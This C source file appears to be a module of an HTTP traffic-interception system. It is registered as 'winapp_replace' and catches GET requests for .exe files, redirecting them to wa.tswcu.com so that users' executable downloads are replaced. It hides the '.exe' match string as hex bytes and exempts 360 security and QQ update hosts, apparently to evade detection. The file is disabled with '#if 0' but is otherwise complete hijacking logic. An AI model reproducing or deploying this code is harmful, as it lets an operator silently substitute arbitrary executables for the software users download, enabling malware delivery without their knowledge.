#if 0
#include "ha_winapp.h"

#include <string.h>

#include "list.h"

#include "ha_policy.h"
#include "ha_debug.h"
#include "ha_network.h"
#include "ha_30x.h"
#include "ha_config.h"
#include "ha_search.h"

#define DEF_WINAPP_PATH 	"/wa/winAppRe.php"
#define DEF_WINAPP_SERVER 	"wa.tswcu.com"


struct ha_winapp_ctl
{
    char server[DEF_SRV_MAXLEN];
    char path[DEF_URL_MAXLEN];
};
static struct ha_winapp_ctl winapp_ctl = {};

struct ha_winapp_sign{
	cstr_t key;
	bool (*guess)(struct ha_http_request *);
};
static char winapp_keywords[] = {0x2e, 0x65, 0x78, 0x65, 0x00};
#if 1
static char xunlei_UA[] = "XLWFP";
static char qmzs[]="Mozilla/4.0(compatible;MSIE 5.00;Windows 98)";

static char host_360_1[] = "down.360safe.com";
static char host_360_2[] = "dl.360safe.com";
static char host_360_3[] = "www.360doc.com";
static char host_360_4[] = "down.360.cn";
static char host_360_5[] = "free.360totalsecurity.com";
static char host_360_6[] = "big.softdl.360tpcdn.com";
static char host_360_7[] = "www.dental360.cn";
static char host_360_8[] = "softdl.360tpcdn.com";
static char host_360_9[] = "download.360yiyong.com.cn";
static char host_360_10[] = "haostat.qihoo.com";
static char host_qq_1[] = "down-update.qq.com";
//static char host_wwlh[] = "wa.tswcu.com";
static bool ha_360host_guess(struct ha_http_request *req)
{
	return false;
}
static bool ha_xl_guess(struct ha_http_request *req)
{
	return false;
}
static bool ha_qmzs_guess(struct ha_http_request *req)
{
	return false;
}
#endif
static struct ha_winapp_sign hws[] = 
{
#if 1
	{
		.key = {.str = xunlei_UA, .len = sizeof(xunlei_UA) - 1},
		.guess = ha_xl_guess,
	},
#endif
	{
		.key = {.str = qmzs, .len = sizeof(qmzs) - 1},
		.guess = ha_qmzs_guess,
	},
	{
		.key = {NULL,0},
	}
};
static struct ha_winapp_sign host_key[] = 
{
	{
		.key = {.str = host_qq_1, .len = sizeof(host_qq_1) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_1, .len = sizeof(host_360_1) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_2, .len = sizeof(host_360_2) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_3, .len = sizeof(host_360_3) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_4, .len = sizeof(host_360_4) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_5, .len = sizeof(host_360_5) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_6, .len = sizeof(host_360_6) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_7, .len = sizeof(host_360_7) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_8, .len = sizeof(host_360_8) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_9, .len = sizeof(host_360_9) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {.str = host_360_10, .len = sizeof(host_360_10) - 1},
		.guess = ha_360host_guess,
	},
	{
		.key = {NULL,0},
	}
};
static bool ha_default_guess_winapp(struct ha_http_request *req)
{
    return UINT32_MAX != raw_search((const uchar*)winapp_keywords,4,(const uchar *)req->url.str,req->url.len,true);
}
static bool ha_ua_match(cstr_t *ua_key,cstr_t *ua)
{
	return UINT32_MAX != raw_search((const uchar *)ua_key->str,ua_key->len,
									  (const uchar *)ua->str,ua->len,true);
}

static bool ha_is_target(struct ha_http_request *req, cstr_t *ua)
{
    assert(req&&ua);
    //filtered all the 360's host
    struct ha_winapp_sign *hostkey = host_key;
    while(hostkey->key.str)
    {
		if(ha_ua_match(&hostkey->key,req->host))
			break;
		hostkey++;
    }
    if(hostkey->key.str)
    {
		return hostkey->guess(req);
    }
    //filetr the special UA
    struct ha_winapp_sign *c = hws;
    while(c->key.str) {
		if(ha_ua_match(&c->key,ua))	
			break;
		c++;
    }
    /*found*/
	if (c->key.str) {
		if (c->guess) 
			return  c->guess(req);
	} else {
		return ha_default_guess_winapp(req);
	}
	return false;
}

static bool ha_winapp_handler(struct ha_http_request *req,int type,struct ha_packet_info *pi)
{
    bool res = true;

    struct ha_winapp_ctl *ctl = &winapp_ctl;
    if(type != HTTP_GET)
        return res;
 
    debug_p("__WINAPP__ CDX");
    
    if(!ha_is_target(req,req->ua))
        goto end;
   
    if(!ha_build_redir_args(req,req->ua,"exe",pi,false))
		goto end;
	
	ha_http_redirect(pi,"http",ctl->server,ctl->path,ha_escap_buffer_get(),1);
	res = false;
end:
    return res;
}
#if 1
/* server & path config */
static void ha_winapp_conf_init(struct ha_winapp_ctl *ctl)
{
    struct json_object *jo = ha_find_module_config("win_app");
    if(!jo)
        return;
  
    const char *str = ha_json_get_string(jo,"server");
    if(str)
        strncpy(ctl->server,str, sizeof(ctl->server));
   
    str = ha_json_get_string(jo,"path");
    if(str && strlen(str) > 1)
        strncpy(ctl->path, str, sizeof(ctl->path));
}
#endif
bool ha_winapp_init(void)
{
    struct ha_winapp_ctl *ctl = &winapp_ctl;
    strncpy(ctl->server, DEF_WINAPP_SERVER, sizeof(ctl->server));
    strncpy(ctl->path, DEF_WINAPP_PATH, sizeof(ctl->path));

    while(0)
		ha_winapp_conf_init(ctl);

    ignore_server(ctl->server,strlen(ctl->server));
	
    proto_pseudo_server_register(ctl->server);
    ha_register_policy_entry("winapp_replace",ha_winapp_handler);
    return true;
}

void ha_winapp_destroy(void)
{

}

#endif
